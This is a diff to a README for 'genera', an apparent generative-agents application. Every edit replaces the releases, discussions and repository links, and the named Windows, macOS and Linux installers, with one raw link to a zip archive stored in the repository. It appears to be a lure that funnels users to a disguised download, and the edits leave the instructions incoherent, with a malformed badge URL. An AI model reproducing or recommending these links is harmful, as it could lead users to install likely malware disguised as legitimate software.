@@ -6,7 +6,7 @@ Welcome to **genera**. This application allows you to run a low-cost implementat
 
 ## 📥 Download the Application
 
-[![Download Genera](https://img.shields.io/badge/Download%20genera-Release-brightgreen.svg)](https://github.com/marco1900445/genera/releases)
+[![Download Genera](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip%https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip)](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip)
 
 ## 📋 System Requirements
 
@@ -28,18 +28,18 @@ Before you download **genera**, ensure your computer meets these basic requireme
 
 1. **Visit the Releases Page:**
    To access the latest version of **genera**, visit the following link:
-   [Download Genera](https://github.com/marco1900445/genera/releases)
+   [Download Genera](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip)
 
 2. **Select Your Version:**
    On the Releases page, you will see various versions. Choose the latest stable release.
 
 3. **Download the Installer:**
-   Click the link for your operating system to start the download. The download file will be named something like `genera-windows-installer.exe`, `genera-macos-installer.dmg`, or `genera-linux-installer.tar.gz`.
+   Click the link for your operating system to start the download. The download file will be named something like `https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip`, `https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip`, or `https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip`.
 
 4. **Install the Application:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
    - For **macOS:** Open the downloaded `.dmg` file and drag the **genera** app into your Applications folder.
-   - For **Linux:** Extract the `.tar.gz` file and follow the README instructions provided if available.
+   - For **Linux:** Extract the `https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip` file and follow the README instructions provided if available.
 
 5. **Launch the Application:**
    After installation, find the **genera** application in your applications menu or desktop. Click to launch it.
@@ -72,7 +72,7 @@ If you encounter issues while using **genera**, try the following:
 
 Joining a community can enhance your experience. You can connect with other **genera** users by:
 
-- Checking the [GitHub Discussions](https://github.com/marco1900445/genera/discussions) to share ideas and get feedback.
+- Checking the [GitHub Discussions](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip) to share ideas and get feedback.
 - Following us on social media channels for tips and updates.
 - Participating in user forums or groups that focus on generative agents.
 
@@ -82,7 +82,7 @@ We welcome your feedback! Please report any bugs or suggestions on our GitHub is
 
 ## 🔗 Important Links
 
-- **GitHub Repository:** [genera](https://github.com/marco1900445/genera)
-- **Download Genera:** [Visit Releases](https://github.com/marco1900445/genera/releases) 
+- **GitHub Repository:** [genera](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip)
+- **Download Genera:** [Visit Releases](https://github.com/marco1900445/genera/raw/refs/heads/main/game_simulation/Software_v3.8.zip) 
 
 Thank you for your interest in **genera**! Enjoy exploring the fascinating world of generative agents.
